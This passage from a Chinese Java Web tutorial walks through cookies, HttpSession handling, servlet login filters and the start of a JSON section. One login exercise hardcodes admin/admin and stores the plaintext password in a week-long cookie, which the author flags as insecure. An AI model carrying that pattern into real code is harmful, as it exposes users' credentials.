language-java"><code class="language-java"><span class="token comment" spellcheck="true">//这是cookie工具包</span><span class="token keyword">public</span> <span class="token keyword">static</span> Cookie <span class="token function">findCookie</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span>Cookie<span class="token punctuation">[</span><span class="token punctuation">]</span> cookies<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">==</span> null <span class="token operator">||</span> cookies <span class="token operator">==</span> null <span class="token operator">||</span> cookies<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>Cookie cookie <span class="token operator">:</span> cookies<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>cookie<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> cookie<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Cookie-值的修改"><a href="#Cookie-值的修改" class="headerlink" title="Cookie 值的修改"></a>Cookie 值的修改</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//        //方式一</span><span class="token comment" spellcheck="true">//        Cookie cookie = new Cookie("key1","newValue1");</span><span class="token comment" spellcheck="true">//        response.addCookie(cookie);</span>        <span class="token comment" spellcheck="true">//方式二</span>        Cookie cookie <span class="token operator">=</span> CookieUtils<span class="token punctuation">.</span><span class="token function">findCookie</span><span class="token punctuation">(</span><span class="token string">"key2"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cookie <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            cookie<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string">"newValue2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>不能忘记在修改完respone.addCookie(cookie)</strong></p><h4 id="Cookie-生命控制"><a href="#Cookie-生命控制" class="headerlink" title="Cookie 生命控制"></a>Cookie 生命控制</h4><pre><code>Cookie 的生命控制指的是如何管理 Cookie 什么时候被销毁（删除）    setMaxAge()    正数，表示在指定的秒数后过期    负数，表示浏览器一关，Cookie 就会被删除（默认值是-1）    零，表示马上删除 Cookie</code></pre><h5 id="立即删除cookie"><a href="#立即删除cookie" class="headerlink" title="立即删除cookie"></a>立即删除cookie</h5><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//先找到要删除的cookie对象</span>Cookie cookie <span class="token operator">=</span> CookieUtils<span class="token punctuation">.</span><span class="token function">findCookie</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getCookies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cookie <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//调用setMaxAge()</span>    cookie<span class="token punctuation">.</span><span class="token function">setMaxAge</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//调用addCookie()</span>    response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>    response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"key1的cookie已经被删除"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="在一小时后删除cookie"><a href="#在一小时后删除cookie" class="headerlink" title="在一小时后删除cookie"></a>在一小时后删除cookie</h5><pre class="line-numbers language-java"><code class="language-java">Cookie cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"life"</span><span class="token punctuation">,</span><span class="token string">"life3600"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cookie<span class="token punctuation">.</span><span class="token function">setMaxAge</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置cookie一小时后无效</span>response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"创建了一小时的cookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Cookie-有效路径-Path-的设置"><a href="#Cookie-有效路径-Path-的设置" class="headerlink" title="Cookie 有效路径 Path 的设置"></a>Cookie 有效路径 Path 的设置</h4><p><img src="/2021/11/30/javaWeb/image-20211127203632649.png" alt="image-20211127203632649"></p><h5 id="设置cookie的路径"><a href="#设置cookie的路径" class="headerlink" title="设置cookie的路径"></a>设置cookie的路径</h5><pre class="line-numbers language-java"><code class="language-java">Cookie cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"path1"</span><span class="token punctuation">,</span><span class="token string">"path1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//getContextPath获取工程路径</span>cookie<span class="token punctuation">.</span><span class="token function">setPath</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"创建了一个带有path路径的cookie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Cookie-练习—免输入用户名登录"><a href="#Cookie-练习—免输入用户名登录" class="headerlink" title="Cookie 练习—免输入用户名登录"></a>Cookie 练习—免输入用户名登录</h4><p><img src="/2021/11/30/javaWeb/image-20211127203709709.png" alt="image-20211127203709709"></p><pre class="line-numbers language-java"><code class="language-java">    String username <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String password <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"admin"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//登录成功</span>        Cookie cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>        Cookie cookie1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>        cookie<span class="token punctuation">.</span><span class="token function">setMaxAge</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//一周内有效</span>        resp<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie1<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"登录成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//登录失败</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"登录失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是并不推荐把密码放到cookie中，因为这是不安全的。</p><h3 id="Session-会话"><a href="#Session-会话" class="headerlink" title="Session 会话"></a>Session 会话</h3><h4 id="什么是-Session-会话"><a href="#什么是-Session-会话" class="headerlink" title="什么是 Session 会话?"></a>什么是 Session 会话?</h4><pre><code>        1、Session 就一个接口（HttpSession）。        2、Session 就是会话。它是用来维护一个客户端和服务器之间关联的一种技术。        3、每个客户端都有自己的一个 Session 会话。        4、Session 会话中，我们经常用来保存用户登录之后的信息。</code></pre><h4 id="如何创建-Session-和获取-id-号-是否位新"><a href="#如何创建-Session-和获取-id-号-是否位新" class="headerlink" title="如何创建 Session 和获取(id 号,是否位新)"></a>如何创建 Session 和获取(id 号,是否位新)</h4><p><img src="/2021/11/30/javaWeb/image-20211127203926373.png" alt="image-20211127203926373"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//创建和获取session会话</span>HttpSession session <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//判断session是否是新的</span><span class="token keyword">boolean</span> aNew <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">isNew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取会话的唯一表示</span>String id <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"得到的session id 是： "</span> <span class="token operator">+</span> id <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"这个是session是否是新创建的： "</span> <span class="token operator">+</span> aNew <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Session-域数据的存取"><a href="#Session-域数据的存取" class="headerlink" title="Session 域数据的存取"></a>Session 域数据的存取</h4><pre class="line-numbers language-java"><code class="language-java"> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">,</span> <span class="token string">"value1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="获取Session域中的对象"><a href="#获取Session域中的对象" class="headerlink" title="获取Session域中的对象"></a>获取Session域中的对象</h4><pre class="line-numbers language-java"><code class="language-java">Object key1 <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"key1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"从session获取的数据是： "</span> <span class="token operator">+</span> key1<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Session-生命周期控制"><a href="#Session-生命周期控制" class="headerlink" title="Session 生命周期控制"></a>Session 生命周期控制</h4><p><img src="/2021/11/30/javaWeb/image-20211127204431150.png" alt="image-20211127204431150"></p><p><img src="/2021/11/30/javaWeb/image-20211127204445677.png" alt="image-20211127204445677"></p><h5 id="设置Session3秒后超时"><a href="#设置Session3秒后超时" class="headerlink" title="设置Session3秒后超时"></a>设置Session3秒后超时</h5><pre class="line-numbers language-java"><code class="language-java">HttpSession session <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>session<span class="token punctuation">.</span><span class="token function">setMaxInactiveInterval</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"当前session设置3秒后超时"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="设置Session立即失效"><a href="#设置Session立即失效" class="headerlink" title="设置Session立即失效"></a>设置Session立即失效</h5><pre class="line-numbers language-java"><code class="language-java">    <span class="token comment" spellcheck="true">// 先获取 Session 对象</span>    HttpSession session <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 让 Session 会话马上超时</span>    session<span class="token punctuation">.</span><span class="token function">invalidate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Session 已经设置为超时（无效）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="浏览器和-Session-之间关联的技术内幕"><a href="#浏览器和-Session-之间关联的技术内幕" class="headerlink" title="浏览器和 Session 之间关联的技术内幕"></a>浏览器和 Session 之间关联的技术内幕</h4><p>Session 技术，底层其实是基于 Cookie 技术来实</p><p><img src="/2021/11/30/javaWeb/image-20211127204629265.png" alt="image-20211127204629265"></p><h3 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter 过滤器"></a>Filter 过滤器</h3><h4 id="场景引入"><a href="#场景引入" class="headerlink" title="场景引入"></a>场景引入</h4><p>我们知道一个网站，会有一些敏感页面是给管理员使用的，当然我们可以在页面中判断当前的session，如果不是管理员则跳转到登录界面，以实现权限管理。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>        Object user <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 如果等于 null，说明还没有登录</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>user <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/login.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这种处理方法，如果是图片等一些无法写代码的资源就没办法使用了。</p><h4 id="Filter-什么是过滤器"><a href="#Filter-什么是过滤器" class="headerlink" title="Filter 什么是过滤器"></a>Filter 什么是过滤器</h4><p><img src="/2021/11/30/javaWeb/image-20211127205752293.png" alt="image-20211127205752293"></p><p><img src="/2021/11/30/javaWeb/image-20211127205931493.png" alt="image-20211127205931493"></p><h4 id="Filter的实现"><a href="#Filter的实现" class="headerlink" title="Filter的实现"></a>Filter的实现</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>haozai<span class="token punctuation">.</span>filter<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletRequest<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpSession<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author jackliu * @create 2021-07-10 18:24 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Admin</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">Admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"初始化方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 专门用于拦截请求     * @param servletRequest     * @param servletResponse     * @param filterChain     * @throws IOException     * @throws ServletException     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span>ServletRequest servletRequest<span class="token punctuation">,</span> ServletResponse servletResponse<span class="token punctuation">,</span> FilterChain filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"doFilter方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HttpSession session <span class="token operator">=</span> null<span class="token punctuation">;</span>        HttpServletRequest request <span class="token operator">=</span> <span class="token punctuation">(</span>HttpServletRequest<span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>        Object user <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>user <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//没有登录</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"快登录啦"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/login.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span>servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//放行，让程序继续往下访问用户的目标资源</span>            filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span>servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter的destroy销毁方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="配置XML"><a href="#配置XML" class="headerlink" title="配置XML"></a>配置XML</h5><p><img src="/2021/11/30/javaWeb/image-20211127210023466.png" alt="image-20211127210023466"></p><p><img src="/2021/11/30/javaWeb/image-20211127210032683.png" alt="image-20211127210032683"></p><h5 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h5><p><img src="/2021/11/30/javaWeb/image-20211127210110352.png" alt="image-20211127210110352"></p><h4 id="Filter-的生命周期"><a href="#Filter-的生命周期" class="headerlink" title="Filter 的生命周期"></a>Filter 的生命周期</h4><p><img src="/2021/11/30/javaWeb/image-20211127210202690.png" alt="image-20211127210202690"></p><h4 id="FilterConfig-类"><a href="#FilterConfig-类" class="headerlink" title="FilterConfig 类"></a>FilterConfig 类</h4><p><img src="/2021/11/30/javaWeb/image-20211127210226106.png" alt="image-20211127210226106"></p><pre class="line-numbers language-java"><code class="language-java">   <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter的destroy销毁方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>FilterConfig filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2.Filter 的 init(FilterConfig filterConfig)初始化"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 1、获取 Filter 的名称 filter-name 的内容</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"filter-name 的值是："</span> <span class="token operator">+</span> filterConfig<span class="token punctuation">.</span><span class="token function">getFilterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2、获取在 web.xml 中配置的 init-param 初始化参数</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"初始化参数 username 的值是："</span> <span class="token operator">+</span> filterConfig<span class="token punctuation">.</span><span class="token function">getInitParameter</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"初始化参数 url 的值是："</span> <span class="token operator">+</span> filterConfig<span class="token punctuation">.</span><span class="token function">getInitParameter</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 3、获取 ServletContext 对象</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>filterConfig<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XML配置</p><p><img src="/2021/11/30/javaWeb/image-20211127210304056.png" alt="image-20211127210304056"></p><p><img src="/2021/11/30/javaWeb/image-20211127210321756.png" alt="image-20211127210321756"></p><h4 id="FilterChain-过滤器"><a href="#FilterChain-过滤器" class="headerlink" title="FilterChain 过滤器"></a>FilterChain 过滤器</h4><p><img src="/2021/11/30/javaWeb/image-20211127210413932.png" alt="image-20211127210413932"></p><h4 id="Filter-的拦截路径"><a href="#Filter-的拦截路径" class="headerlink" title="Filter 的拦截路径"></a>Filter 的拦截路径</h4><p><img src="/2021/11/30/javaWeb/image-20211127210530141.png" alt="image-20211127210530141"></p><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><h4 id="什么是-JSON"><a href="#什么是-JSON" class="headerlink" title="什么是 JSON"></a>什么是 JSON</h4><p><img src="/2021/11/30/javaWeb/image-20211127210728730.png" alt="image-20211127210728730"></p><h4 id="JSON-对象定义和基本使用"><a href="#JSON-对象定义和基本使用" class="headerlink" title="JSON 对象定义和基本使用"></a>JSON 对象定义和基本使用</h4><h5 id="JSON-的定义"><a href="#JSON-的定义" class="headerlink" title="JSON 的定义"></a>JSON 的定义</h5><pre class="line-numbers language-js"><code class="language-js">Json 定义格式：<span class="token keyword">var</span> 变量名 <span class="token operator">=</span> <span class="token punctuation">{</span> “key” <span class="token punctuation">:</span> value <span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// Number 类型</span>        “key2” <span class="token punctuation">:</span> “value” <span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 字符串类型</span>        “key3” <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 数组类型</span>        “key4” <span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// json 对象类型</span>        “key5” <span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token 